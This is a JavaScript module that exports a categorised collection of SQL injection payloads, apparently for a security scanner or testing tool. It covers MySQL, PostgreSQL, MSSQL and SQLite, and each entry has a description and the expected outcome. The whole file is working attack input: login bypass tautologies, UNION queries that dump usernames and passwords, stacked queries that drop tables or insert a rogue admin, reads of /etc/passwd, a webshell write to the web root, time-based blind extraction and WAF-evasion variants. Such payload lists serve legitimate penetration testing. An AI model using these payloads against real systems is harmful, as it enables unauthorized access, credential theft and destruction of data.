/**
 * SQL Injection Payload Module
 * Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 *
 * Categories: basic, advanced, filter_bypass, time_based, context_url, context_json, context_header
 */

const payloads = [
    // ── BASIC ──────────────────────────────────────────────────────────────────
    {
        type: "basic",
        payload: "' OR '1'='1",
        description: "Classic OR tautology — authentication bypass",
        expected_behavior: "Query returns all rows; bypasses login if unparameterized"
    },
    {
        type: "basic",
        payload: "' OR 1=1--",
        description: "OR tautology with comment termination",
        expected_behavior: "Makes WHERE clause always true, comments out remaining query"
    },
    {
        type: "basic",
        payload: "' OR 1=1#",
        description: "OR tautology with MySQL-style comment",
        expected_behavior: "Same as above but uses # for MySQL comment syntax"
    },
    {
        type: "basic",
        payload: "' OR 1=1 LIMIT 1--",
        description: "Auth bypass returning only the first user",
        expected_behavior: "Bypasses auth and returns first DB row to avoid multi-row errors"
    },
    {
        type: "basic",
        payload: "admin'--",
        description: "Comment out password check for admin user",
        expected_behavior: "Logs in as admin by commenting out AND password='...' clause"
    },
    {
        type: "basic",
        payload: "' OR ''='",
        description: "Empty-string tautology bypass",
        expected_behavior: "''='' is always true, bypassing authentication"
    },
    {
        type: "basic",
        payload: "1' AND 1=1--",
        description: "Boolean true test — confirm injection point",
        expected_behavior: "If page loads normally, parameter is injectable"
    },
    {
        type: "basic",
        payload: "1' AND 1=2--",
        description: "Boolean false test — confirm injection point",
        expected_behavior: "If page differs from AND 1=1, confirms boolean-based SQLi"
    },

    // ── ADVANCED ───────────────────────────────────────────────────────────────
    {
        type: "advanced",
        payload: "' UNION SELECT NULL,NULL,NULL--",
        description: "UNION column count enumeration (3 columns)",
        expected_behavior: "If no error, confirms table has 3 columns; adjust NULL count"
    },
    {
        type: "advanced",
        payload: "' UNION SELECT username,password,NULL FROM users--",
        description: "UNION-based credential extraction",
        expected_behavior: "Dumps username and password columns from users table"
    },
    {
        type: "advanced",
        payload: "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
        description: "Extract all table names via information_schema",
        expected_behavior: "Lists all database table names in the response"
    },
    {
        type: "advanced",
        payload: "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--",
        description: "Extract column names from users table",
        expected_behavior: "Lists all column names of the users table"
    },
    {
        type: "advanced",
        payload: "'; DROP TABLE users--",
        description: "Stacked query — drop table (destructive)",
        expected_behavior: "Executes DROP TABLE if stacked queries are supported (MySQL PDO, MSSQL, PostgreSQL)"
    },
    {
        type: "advanced",
        payload: "'; INSERT INTO users(username,password) VALUES('hacker','hacked')--",
        description: "Stacked query — insert rogue admin user",
        expected_behavior: "Creates a new user account with attacker-controlled credentials"
    },
    {
        type: "advanced",
        payload: "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--",
        description: "MySQL LOAD_FILE — read server files",
        expected_behavior: "Reads /etc/passwd from server filesystem (MySQL FILE privilege required)"
    },
    {
        type: "advanced",
        payload: "' UNION SELECT NULL,NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--",
        description: "MySQL INTO OUTFILE — write webshell to disk",
        expected_behavior: "Writes attacker content to web root (MySQL FILE privilege required)"
    },
    {
        type: "advanced",
        payload: "LIMIT CAST((SELECT version()) AS numeric)",
        description: "Error-based extraction — PostgreSQL version leak",
        expected_behavior: "Forces type cast error that leaks PostgreSQL version string"
    },
    {
        type: "advanced",
        payload: "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        description: "Error-based extraction — MySQL version via double query",
        expected_behavior: "Duplicate key error leaks MySQL version() in error message"
    },
    {
        type: "advanced",
        payload: "' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--",
        description: "Error-based extraction — MySQL extractvalue()",
        expected_behavior: "XPath error leaks MySQL version string"
    },
    {
        type: "advanced",
        payload: "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",
        description: "Error-based extraction — MySQL updatexml()",
        expected_behavior: "XML error leaks current MySQL user"
    },

    // ── TIME-BASED BLIND ───────────────────────────────────────────────────────
    {
        type: "time_based",
        payload: "1' AND SLEEP(5)--",
        description: "MySQL time-based blind detection",
        expected_behavior: "Response delayed by 5 seconds confirms MySQL injection"
    },
    {
        type: "time_based",
        payload: "1' AND BENCHMARK(10000000,SHA1('test'))--",
        description: "MySQL BENCHMARK-based time delay",
        expected_behavior: "CPU-intensive operation causes measurable response delay"
    },
    {
        type: "time_based",
        payload: "1'; WAITFOR DELAY '0:0:5'--",
        description: "MSSQL time-based blind detection",
        expected_behavior: "Response delayed by 5 seconds confirms MSSQL injection"
    },
    {
        type: "time_based",
        payload: "1'; SELECT pg_sleep(5)--",
        description: "PostgreSQL time-based blind detection",
        expected_behavior: "Response delayed by 5 seconds confirms PostgreSQL injection"
    },
    {
        type: "time_based",
        payload: "1' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--",
        description: "Conditional time-based blind — boolean extraction",
        expected_behavior: "Delay occurs only when condition is true, enabling bit-by-bit extraction"
    },
    {
        type: "time_based",
        payload: "1' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--",
        description: "Character-by-character database name extraction",
        expected_behavior: "5s delay if first char of DB name is 'a'; iterate to extract full name"
    },

    // ── FILTER BYPASS / WAF EVASION ────────────────────────────────────────────
    {
        type: "filter_bypass",
        payload: "1'/**/OR/**/1=1--",
        description: "Space bypass using inline comments",
        expected_behavior: "/**/ replaces spaces to bypass WAFs that block space characters"
    },
    {
        type: "filter_bypass",
        payload: "1'%09OR%091=1--",
        description: "Space bypass using tab (%09) encoding",
        expected_behavior: "Tab character acts as whitespace separator, evading space filters"
    },
    {
        type: "filter_bypass",
        payload: "1'%0AOR%0A1=1--",
        description: "Space bypass using newline (%0A) encoding",
        expected_behavior: "Newline character used as whitespace separator"
    },
    {
        type: "filter_bypass",
        payload: "1'/*!50000OR*/1=1--",
        description: "MySQL conditional comment bypass",
        expected_behavior: "/*!50000 ... */ executes content on MySQL >= 5.00.00"
    },
    {
        type: "filter_bypass",
        payload: "1' oR 1=1--",
        description: "Mixed case keyword bypass",
        expected_behavior: "SQL keywords are case-insensitive; mixed case evades exact-match filters"
    },
    {
        type: "filter_bypass",
        payload: "1' || 1=1--",
        description: "OR keyword replaced with || operator",
        expected_behavior: "|| is equivalent to OR in most DBMS, bypasses OR keyword filter"
    },
    {
        type: "filter_bypass",
        payload: "1' && 1=1--",
        description: "AND keyword replaced with && operator",
        expected_behavior: "&& is equivalent to AND, bypasses AND keyword filter"
    },
    {
        type: "filter_bypass",
        payload: "1' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--",
        description: "Comma-less UNION SELECT via JOIN bypass",
        expected_behavior: "Uses JOINs instead of commas to enumerate columns"
    },
    {
        type: "filter_bypass",
        payload: "1' AND SUBSTRING(version(),1,1) LIKE 5--",
        description: "Equals sign bypass using LIKE",
        expected_behavior: "LIKE replaces = for comparison, evading = sign filters"
    },
    {
        type: "filter_bypass",
        payload: "1' AND SUBSTRING(version(),1,1) BETWEEN 4 AND 6--",
        description: "Equals sign bypass using BETWEEN",
        expected_behavior: "BETWEEN replaces = for numeric comparison"
    },
    {
        type: "filter_bypass",
        payload: "1' HAVING 1=1--",
        description: "WHERE keyword bypass using HAVING",
        expected_behavior: "HAVING can replace WHERE in certain contexts"
    },
    {
        type: "filter_bypass",
        payload: "1' UNION%0ASELECT%0A1,2,3--",
        description: "URL-encoded newlines between SQL keywords",
        expected_behavior: "Newlines break WAF pattern matching while SQL still parses correctly"
    },

    // ── CONTEXT: URL ───────────────────────────────────────────────────────────
    {
        type: "context_url",
        payload: "id=1%27%20OR%201%3D1--",
        description: "URL-encoded basic SQLi in query parameter",
        expected_behavior: "Decodes to id=1' OR 1=1-- ; bypasses URL-level encoding checks"
    },
    {
        type: "context_url",
        payload: "id=1%27%20UNION%20SELECT%20NULL,NULL,NULL--",
        description: "URL-encoded UNION SELECT",
        expected_behavior: "Full URL encoding of UNION-based injection"
    },
    {
        type: "context_url",
        payload: "search=test%27%20AND%20SLEEP(5)--",
        description: "URL-encoded time-based SQLi in search parameter",
        expected_behavior: "Time-based blind injection in URL-encoded search param"
    },

    // ── CONTEXT: JSON ──────────────────────────────────────────────────────────
    {
        type: "context_json",
        payload: "{\"username\":\"' OR 1=1--\",\"password\":\"anything\"}",
        description: "SQLi in JSON login body",
        expected_behavior: "If JSON values are concatenated into SQL, authentication is bypassed"
    },
    {
        type: "context_json",
        payload: "{\"search\":\"' UNION SELECT username,password FROM users--\"}",
        description: "UNION injection via JSON body search field",
        expected_behavior: "Extracts credentials if JSON input reaches SQL query"
    },
    {
        type: "context_json",
        payload: "{\"id\":\"1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))\"}",
        description: "MSSQL error-based injection in JSON body",
        expected_behavior: "Type conversion error leaks table name in error response"
    },

    // ── CONTEXT: HEADER ────────────────────────────────────────────────────────
    {
        type: "context_header",
        payload: "' OR 1=1--",
        description: "SQLi in Cookie header value",
        expected_behavior: "If cookie session value is used in SQL query, injection succeeds"
    },
    {
        type: "context_header",
        payload: "X-Forwarded-For: ' OR 1=1--",
        description: "SQLi via X-Forwarded-For header",
        expected_behavior: "If app logs or queries on XFF header, injection succeeds"
    },
    {
        type: "context_header",
        payload: "Referer: ' UNION SELECT username,password FROM users--",
        description: "SQLi via Referer header",
        expected_behavior: "If app logs Referer into database unsanitized, UNION injection works"
    },
    {
        type: "context_header",
        payload: "User-Agent: ' AND SLEEP(5)--",
        description: "Time-based blind SQLi via User-Agent header",
        expected_behavior: "If User-Agent is stored/queried unsafely, 5s delay confirms injection"
    },
];

module.exports = {
    vulnerability: "sql_injection",
    name: "SQL Injection",
    description: "Payloads for testing error-based, UNION-based, blind, and time-based SQL injection across MySQL, PostgreSQL, MSSQL, and SQLite",
    payloads,
};
